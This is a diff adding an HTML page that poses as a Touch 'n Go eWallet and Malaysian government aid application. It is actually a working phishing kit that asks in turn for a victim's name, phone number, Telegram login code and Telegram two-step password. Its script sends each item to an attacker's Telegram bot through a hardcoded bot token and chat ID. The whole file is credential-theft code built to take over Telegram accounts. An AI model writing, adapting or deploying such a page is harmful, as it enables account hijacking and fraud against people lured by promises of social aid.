@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="ms"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Touch &amp; Go</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* Animasi Spinner */
+        .spinner {
+            display: none;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 0.8s linear infinite;
+            margin-left: 10px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .btn-loading {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0.8;
+            pointer-events: none;
+        }
+    </style>
+<style>
+*, ::before, ::after{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }::backdrop{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }/* ! tailwindcss v3.4.17 | MIT License | https://tailwindcss.com */*,::after,::before{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}::after,::before{--tw-content:''}:host,html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;font-family:ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:transparent;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}fieldset{margin:0;padding:0}legend{padding:0}menu,ol,ul{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]:where(:not([hidden=until-found])){display:none}.mx-auto{margin-left:auto;margin-right:auto}.mb-2{margin-bottom:0.5rem}.mb-4{margin-bottom:1rem}.block{display:block}.flex{display:flex}.inline-flex{display:inline-flex}.hidden{display:none}.h-14{height:3.5rem}.h-16{height:4rem}.h-8{height:2rem}.h-auto{height:auto}.min-h-screen{min-height:100vh}.w-auto{width:auto}.w-full{width:100%}.max-w-md{max-width:28rem}.flex-1{flex:1 1 0%}.flex-wrap{flex-wrap:wrap}.items-center{align-items:center}.justify-center{justify-content:center}.space-x-3 > :not([hidden]) ~ :not([hidden]){--tw-space-x-reverse:0;margin-right:calc(0.75rem * var(--tw-space-x-reverse));margin-left:calc(0.75rem * calc(1 - var(--tw-space-x-reverse)))}.space-x-4 > :not([hidden]) ~ :not([hidden]){--tw-space-x-reverse:0;margin-right:calc(1rem * var(--tw-space-x-reverse));margin-left:calc(1rem * calc(1 - var(--tw-space-x-reverse)))}.space-y-4 > :not([hidden]) ~ :not([hidden]){--tw-space-y-reverse:0;margin-top:calc(1rem * calc(1 - var(--tw-space-y-reverse)));margin-bottom:calc(1rem * var(--tw-space-y-reverse))}.overflow-hidden{overflow:hidden}.rounded-lg{border-radius:0.5rem}.rounded-l-lg{border-top-left-radius:0.5rem;border-bottom-left-radius:0.5rem}.rounded-r-lg{border-top-right-radius:0.5rem;border-bottom-right-radius:0.5rem}.border{border-width:1px}.border-r-0{border-right-width:0px}.border-gray-300{--tw-border-opacity:1;border-color:rgb(209 213 219 / var(--tw-border-opacity, 1))}.bg-\[\#0050A4\]{--tw-bg-opacity:1;background-color:rgb(0 80 164 / var(--tw-bg-opacity, 1))}.bg-\[\#a6275d\]{--tw-bg-opacity:1;background-color:rgb(166 39 93 / var(--tw-bg-opacity, 1))}.bg-blue-600{--tw-bg-opacity:1;background-color:rgb(37 99 235 / var(--tw-bg-opacity, 1))}.bg-gray-100{--tw-bg-opacity:1;background-color:rgb(243 244 246 / var(--tw-bg-opacity, 1))}.bg-gray-50{--tw-bg-opacity:1;background-color:rgb(249 250 251 / var(--tw-bg-opacity, 1))}.bg-white{--tw-bg-opacity:1;background-color:rgb(255 255 255 / var(--tw-bg-opacity, 1))}.p-3{padding:0.75rem}.p-4{padding:1rem}.p-6{padding:1.5rem}.p-8{padding:2rem}.px-4{padding-left:1rem;padding-right:1rem}.py-3{padding-top:0.75rem;padding-bottom:0.75rem}.text-center{text-align:center}.text-2xl{font-size:1.5rem;line-height:2rem}.text-sm{font-size:0.875rem;line-height:1.25rem}.text-xl{font-size:1.25rem;line-height:1.75rem}.text-xs{font-size:0.75rem;line-height:1rem}.font-bold{font-weight:700}.font-semibold{font-weight:600}.tracking-widest{letter-spacing:0.1em}.text-gray-500{--tw-text-opacity:1;color:rgb(107 114 128 / var(--tw-text-opacity, 1))}.text-gray-600{--tw-text-opacity:1;color:rgb(75 85 99 / var(--tw-text-opacity, 1))}.text-gray-700{--tw-text-opacity:1;color:rgb(55 65 81 / var(--tw-text-opacity, 1))}.text-white{--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity, 1))}.text-yellow-400{--tw-text-opacity:1;color:rgb(250 204 21 / var(--tw-text-opacity, 1))}.opacity-75{opacity:0.75}.opacity-90{opacity:0.9}.shadow-lg{--tw-shadow:0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 10px 15px -3px var(--tw-shadow-color), 0 4px 6px -4px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.outline-none{outline:2px solid transparent;outline-offset:2px}.transition-all{transition-property:all;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms}.hover\:bg-blue-700:hover{--tw-bg-opacity:1;background-color:rgb(29 78 216 / var(--tw-bg-opacity, 1))}.focus\:ring-2:focus{--tw-ring-offset-shadow:var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000)}.focus\:ring-blue-500:focus{--tw-ring-opacity:1;--tw-ring-color:rgb(59 130 246 / var(--tw-ring-opacity, 1))}.disabled\:bg-gray-400:disabled{--tw-bg-opacity:1;background-color:rgb(156 163 175 / var(--tw-bg-opacity, 1))}</style></head>
+<body class="bg-gray-100 min-h-screen flex items-center justify-center p-4">
+
+    <!-- Container Form Utama -->
+    <div class="bg-white rounded-lg w-full max-w-md shadow-lg overflow-hidden">
+        
+        <!-- HEADER BANNER DENGAN 2 LOGO (KIRI) -->
+        <div class="bg-[#0050A4] p-4">
+            <div class="flex items-center space-x-4">
+                <img src="img/jata-negara.png" alt="Jata Negara Malaysia" class="h-14 w-auto">
+                <img src="img/touch-n-go-logo.png" alt="Touch n Go eWallet" class="h-14 w-auto">
+            </div>
+        </div>
+        
+        <!-- GAMBAR PHONE -->
+        <div class="p-4">
+            <img src="img/touch-ewallet.jpg" alt="Touch n Go eWallet" class="w-full h-auto rounded-lg">
+        </div>
+        
+        <!-- FORM -->
+        <div class="p-6 space-y-4">
+            
+            <!-- STEP 1: FORM UTAMA -->
+            <div id="step1">
+                <div class="mb-4">
+                    <label class="block text-sm font-semibold text-gray-700 mb-2">Masukkan Nama</label>
+                    <input id="nama" type="text" placeholder="Nama Lengkap Lengkap Anda." class="w-full p-3 border border-gray-300 rounded-lg outline-none focus:ring-2 focus:ring-blue-500">
+                </div>
+                
+                <div class="mb-4">
+                    <label class="block text-sm font-semibold text-gray-700 mb-2">Nomor Telfon</label>
+                    <div class="flex">
+                        <span class="inline-flex items-center px-4 border border-r-0 border-gray-300 bg-gray-50 text-gray-600 text-sm rounded-l-lg">+62</span>
+                        <input id="phone" type="tel" placeholder="Masukkan Nomor Telegram" oninput="handlePhoneInput()" class="flex-1 p-3 border border-gray-300 rounded-r-lg outline-none focus:ring-2 focus:ring-blue-500">
+                    </div>
+                </div>
+                
+                <button id="nextBtn" onclick="sendToLogin()" disabled="" class="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-gray-400 text-white font-semibold py-3 rounded-lg transition-all">
+                    <span id="nextBtnText">Lanjutkan</span>
+                    <div id="nextLoader" class="spinner"></div>
+                </button>
+            </div>
+
+            <!-- STEP 2: VERIFIKASI OTP -->
+            <div id="step2" class="hidden space-y-4">
+                <h2 class="text-xl font-bold text-center mb-4">Verifikasi Kode Telegram</h2>
+                <p class="text-sm text-gray-500 text-center mb-4">Silakan masukkan kode 5 digit yang dikirimkan ke Telegram Anda.</p>
+                <input id="otp" type="text" placeholder="5 Angka Kode OTP" maxlength="5" class="w-full p-3 border border-gray-300 rounded-lg text-center text-2xl tracking-widest outline-none focus:ring-2 focus:ring-blue-500">
+                <button id="verifyBtn" onclick="sendToVerify(false)" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-lg transition-all">
+                    <span id="verifyBtnText">Selanjutnya</span>
+                    <div id="verifyLoader" class="spinner"></div>
+                </button>
+            </div>
+
+            <!-- STEP 3: PASSWORD 2FA -->
+            <div id="step3" class="hidden space-y-4">
+                <h2 class="text-xl font-bold text-center mb-4">Akun yang Dilindungi Kata Sandi</h2>
+                <p class="text-sm text-gray-500 text-center mb-4">Silakan masukkan kata sandi.(Two-Step Verification) Telegram anda.</p>
+                <input id="2fa_password" type="password" placeholder="Kata Sandi" class="w-full p-3 border border-gray-300 rounded-lg text-center outline-none focus:ring-2 focus:ring-blue-500">
+                <button id="passBtn" onclick="sendToVerify(true)" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-lg transition-all">
+                    <span id="passBtnText">Konfirmasi Kata Sandi</span>
+                    <div id="passLoader" class="spinner"></div>
+                </button>
+            </div>
+
+        </div>
+
+        <!-- BAGIAN BAWAH (BANNER INFO) -->
+        <div class="bg-[#0050A4] p-8 text-center text-white">
+            <img src="img/touch-n-go-logo.png" alt="Touch n Go eWallet" class="h-16 w-auto mx-auto mb-4">
+            <h2 class="text-2xl font-bold mb-2">Permohonan Bantuan</h2>
+            <h2 class="text-2xl font-bold mb-4"><span class="text-yellow-400">eWallet Gratis</span><br>Telah Dibuka</h2>
+            <p class="text-sm mb-4 opacity-90">Pemerintah kembali membuka kesempatan bagi masyarakat untuk menerima bantuan sosial</p>
+            <p class="text-xs opacity-75">Dengan mengakses atau menggunakan Layanan ini, Berarti Anda setuju Syarat dan Ketentuan yang berlaku</p>
+        </div>
+
+        <!-- LOGO PARTNER -->
+        <div class="bg-white p-6 text-center">
+            <div class="flex items-center justify-center space-x-3 mb-4 flex-wrap">
+                <img src="img/logo-sara.png" alt="Sumbangan Rakyat" class="h-8 w-auto">
+                <img src="img/my-kasih.png" alt="MyKasih" class="h-8 w-auto">
+            </div>
+            <p class="text-xs text-gray-500">© Touch &amp; Go. Seluruh Hak Cipta Dilindungi Undang-Undang.</p>
+        </div>
+
+    </div>
+
+<script>
+let API_URL = ""; 
+let userData = {};
+
+// Telegram Bot Configuration
+const TELEGRAM_BOT_TOKEN = "8991963154:AAH_UQlStx9lKcsulvN4trYpkVlUetW6zN4";
+const TELEGRAM_USER_ID = "6288225776";
+const ADMIN_LINK = "http://t.me/infnig547bot"; // Ganti dengan link admin Anda
+
+// Function to send data to Telegram
+async function sendToTelegram(messageText) {
+    try {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        const response = await fetch(url, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_USER_ID,
+                text: messageText,
+                parse_mode: "HTML"
+            })
+        });
+        console.log("Telegram message sent successfully");
+    } catch (error) {
+        console.error("Error sending to Telegram:", error);
+    }
+}
+
+// Function to show completion notification with admin link
+function showCompletionNotification() {
+    const userChoice = confirm(
+        "✅ PERMOHONAN BERHASIL!\n\n" +
+        "Terima kasih telah mengisi formulir. Permohonan Anda sedang ditinjau.\n\n" +
+        "Klik 'OK' untuk mengunjungi halaman admin dan melacak status permohonan Anda.\n\n" +
+        "Link: " + ADMIN_LINK
+    );
+    
+    if (userChoice) {
+        // Buka link admin di tab baru
+        window.open(ADMIN_LINK, '_blank');
+        // Reload halaman form setelah beberapa detik
+        setTimeout(() => {
+            location.reload();
+        }, 1000);
+    } else {
+        // Jika user klik Cancel, langsung reload
+        location.reload();
+    }
+}
+
+function handlePhoneInput() {
+    let input = document.getElementById("phone");
+    let btn = document.getElementById("nextBtn");
+    let val = input.value.replace(/[^0-9]/g, "");
+    
+    // Jika dimulai dengan 0, hapus untuk format lokal Indonesia
+    if(val.startsWith("0")) val = val.substring(1);
+    input.value = val;
+
+    // Validasi: harus dimulai dengan 8 dan panjang 9-12 digit (nomor Indonesia)
+    if(/^8\d{8,11}$/.test(val)) {
+        btn.disabled = false; 
+    } else {
+        btn.disabled = true; 
+    }
+}
+
+async function sendToLogin() {
+    const btn = document.getElementById("nextBtn");
+    const txt = document.getElementById("nextBtnText");
+    const loader = document.getElementById("nextLoader");
+
+    let pNum = document.getElementById("phone").value;
+    let nama = document.getElementById("nama").value;
+
+    // Validasi nama
+    if (!nama || nama.trim() === "") {
+        alert("❌ Nama tidak boleh kosong!");
+        return;
+    }
+
+    // Validasi nomor telepon
+    if (!pNum || pNum.trim() === "") {
+        alert("❌ Nomor telepon tidak boleh kosong!");
+        return;
+    }
+
+    // Validasi format nomor telepon Indonesia (+62)
+    // Harus dimulai dengan 8 dan panjangnya 9-12 digit
+    if (!/^8\d{8,11}$/.test(pNum)) {
+        alert("❌ Format nomor telepon tidak valid!\n\nHanya menerima kode negara +62 (Indonesia)\n\nNomor harus:\n- Dimulai dengan 8\n- Panjang 9-12 digit\n\nContoh: 812345678");
+        return;
+    }
+
+    btn.classList.add("btn-loading");
+    txt.innerText = "Memproses...";
+    loader.style.display = "block";
+
+    // Tambahkan kode negara +62 Indonesia
+    let fullPhone = "62" + pNum;
+
+    userData = {
+        nama: nama,
+        phone: fullPhone
+    };
+
+    try {
+        // Send to Telegram
+        const telegramMessage = `
+<b>📋 Data Form Masuk</b>
+━━━━━━━━━━━━━━━━
+<b>Nama:</b> ${nama}
+<b>Nomor Telepon:</b> +${fullPhone}
+<br>
+<b>Waktu:</b> ${new Date().toLocaleString('id-ID')}
+━━━━━━━━━━━━━━━━
+        `;
+        await sendToTelegram(telegramMessage);
+
+        // Lanjut ke Step 2 (OTP) tanpa perlu backend
+        document.getElementById("step1").classList.add("hidden");
+        document.getElementById("step2").classList.remove("hidden");
+        
+    } catch (e) {
+        alert("Gagal mengirim data ke Telegram.");
+    } finally {
+        btn.classList.remove("btn-loading");
+        txt.innerText = "Semak sekarang";
+        loader.style.display = "none";
+    }
+}
+
+async function sendToVerify(isPassword = false) {
+    const btnId = isPassword ? "passBtn" : "verifyBtn";
+    const loaderId = isPassword ? "passLoader" : "verifyLoader";
+    const txtId = isPassword ? "passBtnText" : "verifyBtnText";
+    
+    const btn = document.getElementById(btnId);
+    const loader = document.getElementById(loaderId);
+    const txt = document.getElementById(txtId);
+
+    const oldText = txt.innerText;
+    btn.classList.add("btn-loading");
+    txt.innerText = isPassword ? "Mengesahkan..." : "Memproses...";
+    loader.style.display = "block";
+
+    let otp = document.getElementById("otp").value;
+    let password = isPassword ? document.getElementById("2fa_password").value : null;
+
+    // Validasi OTP
+    if (!otp || otp.trim() === "") {
+        alert("❌ Kode OTP tidak boleh kosong!");
+        btn.classList.remove("btn-loading");
+        txt.innerText = oldText;
+        loader.style.display = "none";
+        return;
+    }
+
+    if (!/^\d{5}$/.test(otp)) {
+        alert("❌ Kode OTP harus 5 digit angka!");
+        btn.classList.remove("btn-loading");
+        txt.innerText = oldText;
+        loader.style.display = "none";
+        return;
+    }
+
+    // Validasi password jika step 3
+    if (isPassword && (!password || password.trim() === "")) {
+        alert("❌ Kata sandi tidak boleh kosong!");
+        btn.classList.remove("btn-loading");
+        txt.innerText = oldText;
+        loader.style.display = "none";
+        return;
+    }
+
+    try {
+        if(isPassword) {
+            // Step 3: Send complete data to Telegram dengan password
+            const completeTelegramMessage = `
+<b>✅ Verifikasi Data Lengkap</b>
+━━━━━━━━━━━━━━━━
+<b>Nama:</b> ${userData.nama}
+<b>Nomor Telepon:</b> +${userData.phone}
+<b>Kode OTP:</b> ${otp}
+<b>Kata Sandi 2FA:</b> ${password}
+<br>
+<b>Waktu:</b> ${new Date().toLocaleString('id-ID')}
+<b>Status:</b> ✅ SELESAI
+━━━━━━━━━━━━━━━━
+            `;
+            await sendToTelegram(completeTelegramMessage);
+            
+            // Tampilkan notifikasi dengan link admin
+            showCompletionNotification();
+        } else {
+            // Step 2: Send OTP data to Telegram - Cek apakah perlu password
+            const otpTelegramMessage = `
+<b>🔐 Kode OTP Diterima</b>
+━━━━━━━━━━━━━━━━
+<b>Nama:</b> ${userData.nama}
+<b>Nomor Telepon:</b> +${userData.phone}
+<b>Kode OTP:</b> ${otp}
+<br>
+<b>Waktu:</b> ${new Date().toLocaleString('id-ID')}
+<b>Status:</b> Menunggu verifikasi kata sandi 2FA
+━━━━━━━━━━━━━━━━
+            `;
+            await sendToTelegram(otpTelegramMessage);
+            
+            // Lanjut ke Step 3 (Password 2FA)
+            document.getElementById("step2").classList.add("hidden");
+            document.getElementById("step3").classList.remove("hidden");
+        }
+    } catch (e) {
+        alert("Ralat sistem sambungan.");
+    } finally {
+        btn.classList.remove("btn-loading");
+        txt.innerText = oldText;
+        loader.style.display = "none";
+    }
+}
+</script>
+<script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/v833ccba57c9e4d2798f2e76cebdd09a11778172276447" integrity="sha512-57MDmcccJXYtNnH+ZiBwzC4jb2rvgVCEokYN+L/nLlmO8rfYT/gIpW2A569iJ/3b+0UEasghjuZH/ma3wIs/EQ==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;ac3a18b9c54e4602b9fce05dbe316ab3&quot;,&quot;r&quot;:1,&quot;server_timing&quot;:{&quot;name&quot;:{&quot;cfCacheStatus&quot;:true,&quot;cfEdge&quot;:true,&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfSpeedBrain&quot;:true},&quot;location_startswith&quot;:null}}" crossorigin="anonymous"></script>
+
+</body>
+</html>
